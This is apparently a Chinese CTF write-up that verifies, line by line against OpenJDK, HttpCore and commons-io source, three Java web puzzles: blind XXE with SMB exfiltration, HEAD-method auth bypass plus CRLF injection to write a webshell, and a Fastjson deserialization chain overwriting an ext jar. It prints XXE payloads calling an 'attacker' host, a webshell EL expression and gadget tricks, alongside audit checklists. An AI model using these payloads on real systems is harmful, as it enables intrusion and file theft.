> 基于 [cwkiller/Java-Puzzle](https://github.com/cwkiller/Java-Puzzle) 三道 Java Web 安全谜题,结合 OpenJDK、Apache HttpCore、Apache commons-io 的官方源码,对每条利用结论进行逐行验证与扩展分析。
>
> **写作目的**:把「单点 trick」沉淀为「可批量复制的审计方法论」。所有结论均附源码位置与版本 diff,可独立复现。

---

# 目录

- [一、谜题总览](#一谜题总览)
- [二、题一 No-FTP-XXE:协议差异是富矿](#二题一-no-ftp-xxe协议差异是富矿)
- [三、题二 Tomcat's Secret Chamber:`(byte)char` 高位截断](#三题二-tomcats-secret-chamberbytechar-高位截断)
- [四、题三 Fastjson Decoder:失败前的副作用](#四题三-fastjson-decoder失败前的副作用)
- [五、跨题方法论沉淀](#五跨题方法论沉淀)
- [六、可执行的审计检查清单](#六可执行的审计检查清单)
- [附录:版本边界与源码索引](#附录版本边界与源码索引)

---

# 一、谜题总览

Java-Puzzle 是一个 Java Web 安全谜题(CTF)集合,每题基于真实审计场景设计,包含三个独立挑战:

| 序号 | 名称 | 难度 | 核心知识点 | 关键版本 |
|------|------|------|-----------|---------|
| 01 | **No-FTP-XXE** | ⭐⭐⭐ | 盲 XXE、协议解析差异、多行文件外带 | dom4j、Spring、Windows、JDK ≥ 8u131 |
| 02 | **Tomcat's Secret Chamber** | ⭐⭐⭐ | Servlet 3.0 `web-fragment` 隐藏配置、HEAD 绕过、不出网 SSRF GetShell | Tomcat 9.0.10、Apache HttpClient < 4.5.10 |
| 03 | **Fastjson Decoder** | ⭐⭐⭐ | Fastjson 反序列化、commons-io 链 NPE 适配、ASCII jar 覆盖 ext | Fastjson 1.2.78、commons-io 2.2、OpenJDK 8u342 |

本文对每道题做三层分析:**① 题目与官方解 → ② 源码级验证 → ③ 审计/渗透可复用经验**。

---

# 二、题一 No-FTP-XXE:协议差异是富矿

## 2.1 题目与官方解

**漏洞代码**(Spring + dom4j):
```java
@PostMapping("/update-config")
public ResponseEntity<Map<String, Object>> updateSystemConfig(
        @RequestParam("configXml") String configXml, ...) {
    CompletableFuture.runAsync(() -> {                        // 异步
        try {
            SAXReader reader = new SAXReader();
            Document document = reader.read(new StringReader(configXml));  // ★ XXE sink
            processConfigDocument(document);
        } catch (DocumentException e) {
            System.err.println("配置处理错误: " + e.getMessage());   // 异常全吞
        }
    });
    ...
}
```

**特征**:异步处理 + 所有异常被吞 → 报错 XXE 路线被堵死,只剩 OOB(外带)。

**官方解**:目标为 Windows,高版本 JDK(JDK ≥ 8u131)无法用 FTP 外带多行文件,最终用 **file/netdoc 协议构造 UNC 路径,通过 SMB 外带**:

```xml
<!-- 1. 列目录拿到 flag 文件名 -->
<!DOCTYPE data [
<!ENTITY % f SYSTEM "netdoc://C:/">
<!ENTITY % dtd SYSTEM "http://attacker:9991/data.dtd"> %dtd;
]>
<data>&send;</data>

<!-- 2. 读文件内容(data.dtd 把 %f 拼进 UNC 路径发往 SMB) -->
<!ENTITY % file SYSTEM "file:///C:/flagxdzqs.txt">
```

工具链:`xxe-smb-server`(impacket 开匿名 SMB)+ `python3 -m http.server` 放恶意 DTD + `tcpdump -i eth0 port 445 -w smb.pcap` 抓包。

## 2.2 源码级验证

### 2.2.1 协议清单是可枚举的

`URL.getURLStreamHandler`(OpenJDK `java/net/URL.java:1133`)按命名约定 `sun.net.www.protocol.<协议>.Handler` 解析处理器:

```java
packagePrefixList += "sun.net.www.protocol";                  // :1160
String clsName = packagePrefix + "." + protocol + ".Handler"; // :1171-1172
```

从源码目录看,JDK **内置且仅内置这 7 个协议**:

```
file  ftp  http  https  jar  mailto  netdoc
```

**审计意义**:拿到一个 JDK/中间件环境,先列出实际存在的 Handler 目录,得到一份确定的「可达协议清单」,再逐个分析过滤策略——而不是盲目试探。

### 2.2.2 FTP:修复 commit 的精确位置(8u131,不是 8u162)

网上流传分界线是 `jdk<8u162`,源码 diff 证明**真正分界是 8u131**。

**8u121 `FtpClient.java:520-533`(修复前)**:
```java
private boolean issueCommand(String cmd) throws IOException {        // 只声明 IOException
    ...
    sendServer(cmd + "\r\n");                                        // ★ 直接发,无换行检查
    return readReply();
}
```

**8u131 `FtpClient.java:520-540`(修复后)**:
```java
private boolean issueCommand(String cmd) throws IOException,
        sun.net.ftp.FtpProtocolException {                           // 新增异常
    ...
    if (cmd.indexOf('\n') != -1) {                                   // ★ 新增检查
        sun.net.ftp.FtpProtocolException ex
                = new sun.net.ftp.FtpProtocolException("Illegal FTP command");
        ex.initCause(new IllegalArgumentException("Illegal carriage return"));
        throw ex;
    }
    sendServer(cmd + "\r\n");
    return readReply();
}
```

精确 diff:`8u121 → 8u131` 只多了两个改动——签名加 `FtpProtocolException`、新增 6 行 `indexOf('\n')` 检查。`8u131 → 8u202` 完全一致,检查一直保留。所有 FTP 命令(含 user/pass 认证字段)最终都走 `issueCommand`,无一幸免。

### 2.2.3 HTTP:双重拦截 + 构造期检查

```java
// HttpURLConnection.java:847 — 构造时检查整个 URL
private static URL checkURL(URL u) throws IOException {
    if (u != null) {
        if (u.toExternalForm().indexOf('\n') > -1) {        // 整个 URL 外部形式
            throw new MalformedURLException("Illegal character in URL");
        }
    }
    return u;
}

// HttpURLConnection.java:828 — 另一个构造器检查 host
private static String checkHost(String h) throws IOException {
    if (h != null) {
        if (h.indexOf('\n') > -1) {                          // host 单独再查
            throw new MalformedURLException("Illegal character in host");
        }
    }
    return h;
}
```

`checkURL` 在构造函数 `super(checkURL(u))`(:857)就调用,**请求还没发,构造 URL 时就抛异常**。writeup 提到的 userinfo(`user:pass@host`)虽允许传入但不自动带 Authorization 头,加上这道构造期检查,HTTP 外带彻底无解。

### 2.2.4 mailto:命令字段的 `\n` 拦截

mailto 委托给 `sun.net.smtp.SmtpClient`:
```java
// SmtpClient.java:77 — RCPT TO
public void to(String s) throws IOException {
    if (s.indexOf('\n') != -1) {                            // ★
        throw new IOException("Illegal SMTP command", ...);
    }
    ...
    issueCommand("rcpt to: <" + s + ">\r\n", 250);
}

// SmtpClient.java:123 — MAIL FROM,同样检查
public void from(String s) throws IOException {
    if (s.indexOf('\n') != -1) {                            // ★
        throw new IOException("Illegal SMTP command", ...);
    }
    ...
}
```

`to()` / `from()` 都拦 `\n`,且 mailto 的 `Handler` 不实现输入(只返回 `MailToURLConnection`),`protocol doesn't support input`,OOB 触发读取时直接报错。

### 2.2.5 file / netdoc:无过滤的逃生口

```java
// netdoc/Handler.java — openConnection 回退到 file 协议
if (uc == null) {
    try {
        ru = new URL("file", "~", file);                    // ★ 回退到 file
        uc = ru.openConnection();
    } ...
}
```

`netdoc` 先尝试文档 URL,失败就 `new URL("file",...)`。而 **file 协议处理器没有任何换行检查**,所以 `file://\\attacker\share` 或 `netdoc://\\attacker\share` 构造的 UNC 路径畅通无阻,Windows 上触发 SMB 连接,多行内容进了 SMB 数据包——这就是 SMB 能外带多行的根本原因。

### 2.2.6 七协议过滤矩阵(源码验证结果)

| 协议 | 关键代码位置 | `\n` 是否被拦 | 结论 |
|------|------------|--------------|------|
| **ftp** | `FtpClient#issueCommand` (8u131+:532) | ✅ 拦 | JDK≥8u131 无法外带多行 |
| **http/https** | `HttpURLConnection#checkURL` (8u202:849) | ✅ 拦 | 整个 URI 含 `\n` 直接 MalformedURLException |
| **http host** | `HttpURLConnection#checkHost` (8u202:830) | ✅ 拦 | host 部分含 `\n` 也拦 |
| **mailto** | `SmtpClient#to`(78) / `#from`(124) | ✅ 拦 | RCPT TO / MAIL FROM 都判 `\n` |
| **jar** | 委托给 http | ✅ 拦 | 等同 http |
| **file** | 无 `\n` 过滤 | ❌ 不拦 | **唯一突破口** |
| **netdoc** | `Handler#openConnection` 回退到 `file` | ❌ 不拦 | **另一突破口** |

## 2.3 审计/渗透可复用经验

1. **DOM4J 的 `SAXReader` 是高频 XXE 点**。审计全文搜 `SAXReader`、`DocumentBuilder`、`XMLInputFactory`、`Unmarshaller`、`Transformer`,确认是否做了 `FEATURE_DISALLOW_DOCTYPE_DECL` 等加固。
2. **异步 + 异常全吞 ≠ 安全**。报错 XXE 被堵死,但 OOB 依然成立。不要因为「异常被吞了」就放行 XXE。
3. **判断 OS 看「外带服务有没有收到请求」**:请求 `/etc/passwd` 收不到回连,立刻怀疑 Windows。
4. **协议安全检查是分散的、非对称的**。JDK 把 `\n` 拦截做在每个处理器自己的代码里,而不是统一网络层。看到一个协议有过滤,**绝不能推断其他协议也有**,必须逐个验证。
5. **版本边界用源码 diff 确认**,不能信二手说法(8u131 ≠ 8u162)。

## 2.4 实战坑点

1. **Win11 安全策略不允许访问匿名 SMB**,只发认证请求不发 `Tree Connect Request`,需 `map to guest = Bad User`。
2. **家宽到云服务器 445 出站被封**,换云厂商没用,是出口侧被封。
3. **`Tree Connect Request` 首字符不能是 `;`**:绕过用 `file:////ip/a%file;` 前面加字符。

---

# 三、题二 Tomcat's Secret Chamber:`(byte)char` 高位截断

## 3.1 题目与官方解

本题分两部分:**权限绕过** + **不出网 SSRF GetShell**。

### 第一部分:隐藏配置 + HEAD 绕过

访问 `/admin/getimg.jsp` 返回 403,但 `web.xml` 为空。配置藏在 **JAR 包的 `web-fragment.xml`** 里:
```
WEB-INF/lib/ant-apache-xalan2.jar!/META-INF/web-fragment.xml
```
```xml
<security-constraint>
    <web-resource-collection>
        <url-pattern>/admin/*</url-pattern>
        <http-method>GET</http-method>      <!-- 只限 GET/POST -->
        <http-method>POST</http-method>
    </web-resource-collection>
    <auth-constraint></auth-constraint>      <!-- 拒绝所有角色 -->
</security-constraint>
```

**绕过**:用 `HEAD` 方法。JSP 编译后继承 `HttpJspBase`,`HttpServlet#service` 对 HEAD 的处理是「调用 `doGet` + 包 `NoBodyResponse`(吞响应体)」。所以 **`HEAD /admin/getimg.jsp` 绕过权限**,副作用(文件写入/SSRF)照样执行。

### 第二部分:不出网 SSRF 写 shell

`getimg.jsp` 用 Apache HttpClient 请求 `url` 参数,响应体写入 `/img/<最后一个斜杠后的内容>`,后缀无限制、只过滤 `..`。需要让 Tomcat 自己返回含 JSP 代码的响应:

1. HTTP 头值部分可触发 Tomcat 错误回显。
2. **Apache HttpClient < 4.5.10 有 CRLF 注入**:`\n` 被防御,但 Unicode `\u560a`(URL 编码 `%E5%98%8A`)能绕过。
3. CRLF 注入到响应头,注入 **EL 表达式** `${param.getClass().forName(...)...eval(param.cmd)}` 构造 webshell。
4. 写入文件,ScriptEngine 落地内存马。

## 3.2 源码级验证:`(byte)char` 截断的完整调用链

writeup 说修复在 `ByteArrayBuffer`,源码印证漏洞点就是 `append(char[])` 里的一行强转。

**漏洞代码(HttpCore 4.4.11 `ByteArrayBuffer.java:138-140`)**:
```java
for (int i1 = off, i2 = oldlen; i2 < newlen; i1++, i2++) {
    this.buffer[i2] = (byte) b[i1];        // ★ char 强转 byte,丢弃高8位
}
```

**完整调用链**(writeup 没展开,源码补全):
```
AbstractMessageWriter.write(message)                  // 序列化整个 HTTP 消息
  ├─ writeHeadLine(message)                           // 写请求行
  └─ for each header:
       sessionBuffer.writeLine(                       // AbstractMessageWriter:111
           lineFormatter.formatHeader(lineBuf, header))   // 格式化 "Name: Value"
            │
            ▼
SessionOutputBufferImpl.writeLine(CharArrayBuffer)    // :232
  └─ this.buffer.append(charbuffer, off, chunk)       // :243  char[] → byte 缓冲
            │
            ▼
ByteArrayBuffer.append(char[] b, int off, int len)    // :122
  └─ this.buffer[i2] = (byte) b[i1];                  // :139  ★ 截断发生处
            │  之后 writeLine(CRLF) 追加 \r\n  (:255)
            ▼
        网络发出含注入换行的请求头
```

`\u560a` 的低 8 位正是 `0x0a`,高 8 位 `0x56` 被截断丢弃 → 变成 `\u000a`(`\n`)。推论 `\uxx0a`(xx 任意)都成立。

**修复 commit(HttpCore 4.4.12,client 4.5.10 引入)**:
```java
// ByteArrayBuffer.java (4.4.12) 第 139-146 行
for (int i1 = off, i2 = oldlen; i2 < newlen; i1++, i2++) {
    if ((b[i1] >= 0x20 && b[i1] <= 0x7E) ||    // 可见 ASCII
        (b[i1] >= 0xA0 && b[i1] <= 0xFF)) {    // 可见 ISO-8859-1
        this.buffer[i2] = (byte) b[i1];
    } else {
        this.buffer[i2] = '?';                  // ★ 超范围一律替换为 ?
    }
}
```

`0x0a` 不在 `[0x20,0x7E]∪[0xA0,0xFF]`,任何换行字符被替换成 `?`,CRLF 注入堵死。修复**只改了 `char` 来源路径**,没动 `append(byte[])` 和 `append(int)`(那两个本来就是 byte),定位精准。

## 3.3 审计/渗透可复用经验

1. **`web.xml` 为空不代表没有安全配置**。Servlet 3.0 的 `web-fragment.xml` 允许 JAR 在 `META-INF` 定义 security-constraint。审计时**必须解压所有 JAR 搜 `web-fragment.xml`、`<security-constraint>`、`<url-pattern>`**。
2. **`<http-method>` 枚举是致命疏漏**:没列的方法默认放行。看到枚举方法立刻检查 JSP/Servlet 是否支持其他方法(HEAD/OPTIONS/PUT/DELETE)。
3. **HEAD 绕过的通用性**:任何只重写 `doGet`/`doPost` 的 Servlet 都能用 HEAD/TRACE 访问。`HttpServlet#service` 对 HEAD 是「调 doGet + NoBodyResponse 吞响应体」。
4. **`(byte)charValue` 是可扫描的漏洞指纹**。grep 全量搜 `\(byte\)\s*\w+\[` 强转模式,出现在「网络/序列化/编码转换」路径上的高危。**正确修复是白名单(只放行可见字符),不是黑名单(拦 `\r\n`)**——黑名单会漏掉 `\u560a` 编码绕过。
5. **SSRF 文件下载必须限白名单后缀**。本题 `fileName.indexOf("..")` 只过滤目录穿越,不限后缀导致写 jsp。

---

# 四、题三 Fastjson Decoder:失败前的副作用

## 4.1 题目与官方解

Fastjson 1.2.78 + commons-io 2.2。公开的 commons-io 链(`WriterOutputStream`)在 Docker/OpenJDK 环境因 `decoder` 参数为 null 报 NPE。但 fastjson 反序列化是**从内层到外层**依次构造,外层 `LockableFileWriter` 在 `WriterOutputStream` 之前处理——**副作用(建带锁空文件)依然发生**。

**适配 NPE 的关键 trick**:
```json
"decoder":{"@type":"com.alibaba.fastjson.util.UTF8Decoder"}
```
用 Fastjson 自带的 `UTF8Decoder` 填充原本为 null 的 `decoder` 字段,绕过 NPE。

**落地链**:
1. 生成纯 ASCII jar(c0ny1 脚本,padding 让 zip 各字段落在 ASCII 范围)。
2. 覆盖 `$JRE/lib/ext/dnsns.jar`(`-verbose:class` 查未加载的 ext jar)。
3. `@type` 指向 `sun.net.spi.nameservice.dns.DNSNameServiceDescriptor`,其构造函数执行 `Runtime.exec(message)`。

## 4.2 源码级验证

### 4.2.1 NPE 根因:构造函数选择决定成败

```java
// WriterOutputStream.java
private final CharsetDecoder decoder;          // :77 — final,必须构造时赋值

// 构造函数 A:直接接收 decoder (4参, :120)
public WriterOutputStream(Writer writer, CharsetDecoder decoder, int bufferSize, ...) {
    this.decoder = decoder;                     // :122 — 用外部传入的 decoder
}

// 构造函数 C:用 Charset (4参, :139) — 内部 newDecoder,decoder 非空
public WriterOutputStream(Writer writer, Charset charset, int bufferSize, ...) {
    this(writer, charset.newDecoder()..., ...); // :140-141 → 转调 A
}

// 构造函数 B:用 charsetName (4参, :173) → 转调 C → 转调 A,decoder 非空
```

**NPE 真正原因**:Fastjson 在不同 JDK 发行版下选中的构造函数不同。
- **Mac IDEA**:选中 `(Writer, String charsetName, ...)`(:173)或 `(Writer, Charset, ...)`(:139),内部 `newDecoder()` 非 null → 不报 NPE。
- **Docker/OpenJDK**:选中 `(Writer, CharsetDecoder, ...)`(:120),payload 未显式给 `decoder` → `decoder = null` → `processInput()`(:280)调 `this.decoder.decode(...)` 触发 NPE。

writeup 的 `"decoder":{"@type":"...UTF8Decoder"}` 就是**强行给构造函数 A 注入非 null decoder**,源码完美解释其有效性。

### 4.2.2 副作用时序(题三最核心的审计点)

`LockableFileWriter` 构造函数(:158-184)的副作用时序:
```
new LockableFileWriter(file, encoding, append=false, lockDir)
  ├─ :164  FileUtils.forceMkdir(parent)        ← 副作用①:创建父目录
  ├─ :175  FileUtils.forceMkdir(lockDirFile)   ← 副作用②:创建锁目录
  ├─ :180  createLock()
  │    └─ :212 lockFile.createNewFile()         ← 副作用③:创建 .lck 锁文件
  │    └─ :216 lockFile.deleteOnExit()
  └─ :183  initWriter(file, encoding, append)
       └─ :238 new FileOutputStream(file, append=false)
            ← 副作用④:创建/截断目标文件(append=false 截断为 0 字节)
```

**关键**:外层 `WriterOutputStream` 在内层 `LockableFileWriter` 实例化**之后**才创建,而 Fastjson 从内层到外层依次构造。即使外层后续抛 NPE,**副作用 ①-④ 已全部发生**——目标文件已截断为空、锁文件已建。这就是「还是创建一个带锁的空文件」的源码级根因。

## 4.3 审计/渗透可复用经验

1. **失败 ≠ 无害:追踪构造函数里、抛异常前的副作用**。逐行列出「在第一个可能抛异常的语句前,已改了哪些外部状态」(建文件、建目录、建锁、写日志、发网络请求)。
2. **构造函数歧义是反序列化漏洞的放大器**。`WriterOutputStream` 有 7 个构造函数,3 个参数族对 null 容忍度不同。**审计反序列化 sink 时,穷举所有构造函数,画「每个构造函数对每个 final 字段的赋值来源」**。
3. **环境差异归因到具体代码路径分歧**,不要停在「JDK 发行版不同」。本题真正分歧是「Fastjson 选中的构造函数不同」。
4. **公开链报 NPE 别判死刑**:看「报错之外副作用是否仍发生」。
5. **ASCII jar + 覆盖未加载 ext jar** 是 Fastjson 文件写 getshell 的通用落地手法,`-verbose:class` 是审计工具。

---

# 五、跨题方法论沉淀

三道题在源码层面验证出**三条可复用的审计规则**,都可机械化执行(grep 强转、grep 构造函数、画副作用时序):

| 规则 | 题一(协议) | 题二(类型截断) | 题三(构造函数歧义) |
|------|-----------|---------------|-------------------|
| **过滤是分散的、逐实现做的,不能跨实现推断** | ftp/http/mailto 各自拦 `\n`,file/netdoc 不拦 | `append(byte[])` 不过滤,`append(char[])` 才截断——同一类两个方法策略不同 | 7 个构造函数,只有接 `CharsetDecoder` 的那个会让 decoder 为 null |
| **版本边界靠 diff 确认,不能信二手说法** | 8u131 不是 8u162 | httpcore 4.4.12 / client 4.5.10 | commons-io 2.2 此构造函数族一直存在 |
| **关注失败前的副作用,而非失败本身** | 命令被拦 = 外带失败,无副作用残留 | 字符被替换为 `?` = 注入失败,无副作用 | **NPE 抛在外层,内层文件副作用已完成** ← 最典型 |

## 通用分析方法

1. **拿到代码先排异常处理路径**:异常被吞(题一)、`web.xml` 为空(题二)、公开链报 NPE(题三),都不是终点。
2. **协议/类型/构造函数差异是富矿**:每种实现的处理都不同,逐个验证。
3. **Java 类型强转是漏洞模式**:`(byte)char` 高位截断(题二)、`indexOf(10)` 单字符判断(题一)。
4. **隐藏配置的排查**:解压所有 JAR 扫 `META-INF/`。
5. **HTTP 方法完整性**:`security-constraint` 的 `<http-method>`、Servlet 的 `doGet/doPost`、JSP 的方法支持——只要没覆盖全集就可能绕过。
6. **环境一致性**:本地 IDE 与 Docker 表现不同,优先怀疑 JDK 发行版差异,在目标同构环境复现。

---

# 六、可执行的审计检查清单

## XXE
- [ ] 全文搜 `SAXReader` / `DocumentBuilder` / `XMLInputFactory` / `Unmarshaller` / `Transformer`,确认 doctype 禁用。
- [ ] 异步/异常吞掉的 XML 解析点,验证 OOB(外带)是否成立。
- [ ] 列出目标 JDK 的可达协议清单(`sun.net.www.protocol.*`),逐个评估外带面。
- [ ] 确认 JDK 版本,**用源码 diff 而非二手文档**判断 FTP 外带分界(8u131)。

## 权限控制
- [ ] 解压所有 JAR,搜 `web-fragment.xml` / `web-fragment_*.xsd` / `<security-constraint>`。
- [ ] 检查 `<http-method>` 是否枚举了全集;未列的方法默认放行。
- [ ] 对每个受保护资源测试 HEAD / OPTIONS / TRACE / PUT / DELETE。
- [ ] Servlet 只重写 `doGet`/`doPost` 的,验证 HEAD 是否能触发副作用。

## 类型截断 / 编码
- [ ] grep `\(byte\)\s*\w+\[` 强转模式,标注网络/序列化路径上的高危点。
- [ ] HTTP 客户端版本核对(Apache HttpClient < 4.5.10 存在 CRLF 注入)。
- [ ] 写文件功能检查后缀白名单,不只过滤 `..`。

## 反序列化
- [ ] 反序列化 sink 目标类穷举构造函数,画 final 字段赋值来源表。
- [ ] 画构造函数副作用时序(抛异常前已改的外部状态)。
- [ ] 公开链报错时,验证「失败前的副作用是否仍发生」。
- [ ] 文件写 getshell:确认目标 JDK 版本(ext jar 可加载性)、`-verbose:class` 列未加载 jar。

---

# 附录:版本边界与源码索引

## A.1 版本边界速查

| 组件 | 漏洞 | 修复版本 | 真实分界(源码验证) |
|------|------|---------|-------------------|
| OpenJDK 8 | FTP 多行外带 | 8u131 | `FtpClient#issueCommand` 新增 `indexOf('\n')` 检查 |
| OpenJDK 8 | HTTP URI `\n` | 早期版本起 | `HttpURLConnection#checkURL` 构造期检查 |
| Apache HttpCore | `(byte)char` CRLF 注入 | **4.4.12** | `ByteArrayBuffer#append(char[])` 白名单过滤 |
| Apache HttpClient | 同上(引入 httpcore) | **4.5.10** | 升级 httpcore 4.4.11 → 4.4.12 |
| commons-io 2.2 | `WriterOutputStream` decoder null | 未单独修(利用链适配) | 构造函数族一直存在 |
| Fastjson | 1.2.78 commons-io 链 | 需手动适配 decoder | `UTF8Decoder` 填充绕过 NPE |

## A.2 关键源码文件索引

**题一(协议差异):**
| 文件 | 仓库 / Tag | 关键行 |
|------|-----------|--------|
| `sun/net/ftp/impl/FtpClient.java` | openjdk/jdk8u (8u121 / 8u131 / 8u202) | 8u131:532 |
| `sun/net/www/protocol/http/HttpURLConnection.java` | openjdk/jdk8u jdk8u202-b08 | checkURL:849, checkHost:830 |
| `sun/net/smtp/SmtpClient.java` | openjdk/jdk8u jdk8u202-b08 | to:78, from:124 |
| `sun/net/www/protocol/netdoc/Handler.java` | openjdk/jdk8u jdk8u202-b08 | openConnection 回退 file |
| `java/net/URL.java` | openjdk/jdk8u jdk8u202-b08 | getURLStreamHandler:1133 |

**题二(类型截断):**
| 文件 | 仓库 / Tag | 关键行 |
|------|-----------|--------|
| `org/apache/http/util/ByteArrayBuffer.java` | apache/httpcomponents-core rel/v4.4.11 vs 4.4.12 | append(char[]):139 |
| `org/apache/http/impl/io/AbstractMessageWriter.java` | apache/httpcomponents-core rel/v4.4.11 | write():106-116 |
| `org/apache/http/impl/io/SessionOutputBufferImpl.java` | apache/httpcomponents-core rel/v4.4.11 | writeLine():232-256 |

**题三(副作用时序):**
| 文件 | 仓库 / Tag | 关键行 |
|------|-----------|--------|
| `org/apache/commons/io/output/WriterOutputStream.java` | apache/commons-io 2.2 | decoder 字段:77, 构造函数:120/139/173 |
| `org/apache/commons/io/output/LockableFileWriter.java` | apache/commons-io 2.2 | 构造函数副作用:158-184 |

## A.3 复现步骤

所有源码均可从 GitHub 公开仓库直接获取,无需鉴权:
```bash
# 题一:对比 JDK 8u121 与 8u131 的 FTP 修复
curl -o FtpClient_8u121.java https://raw.githubusercontent.com/openjdk/jdk8u/jdk8u121-b13/jdk/src/share/classes/sun/net/ftp/impl/FtpClient.java
curl -o FtpClient_8u131.java https://raw.githubusercontent.com/openjdk/jdk8u/jdk8u131-b11/jdk/src/share/classes/sun/net/ftp/impl/FtpClient.java
diff FtpClient_8u121.java FtpClient_8u131.java

# 题二:对比 HttpCore 4.4.11 与 4.4.12 的 ByteArrayBuffer 修复
curl -o BA_4.4.11.java https://raw.githubusercontent.com/apache/httpcomponents-core/rel/v4.4.11/httpcore/src/main/java/org/apache/http/util/ByteArrayBuffer.java
curl -o BA_4.4.12.java https://raw.githubusercontent.com/apache/httpcomponents-core/rel/v4.4.12/httpcore/src/main/java/org/apache/http/util/ByteArrayBuffer.java
diff BA_4.4.11.java BA_4.4.12.java

# 题三:commons-io 2.2 构造函数族
curl -o WriterOutputStream.java https://raw.githubusercontent.com/apache/commons-io/2.2/src/main/java/org/apache/commons/io/output/WriterOutputStream.java
curl -o LockableFileWriter.java https://raw.githubusercontent.com/apache/commons-io/2.2/src/main/java/org/apache/commons/io/output/LockableFileWriter.java
```

---

> **声明**:本文内容仅用于安全研究、代码审计学习与防御教学。所有源码引用均来自官方公开仓库,漏洞利用部分基于公开的 CTF 谜题场景。请在授权环境下进行安全测试。

*整理自 Java-Puzzle 三道谜题的 writeup 与 OpenJDK / Apache HttpCore / Apache commons-io 源码级验证分析。*
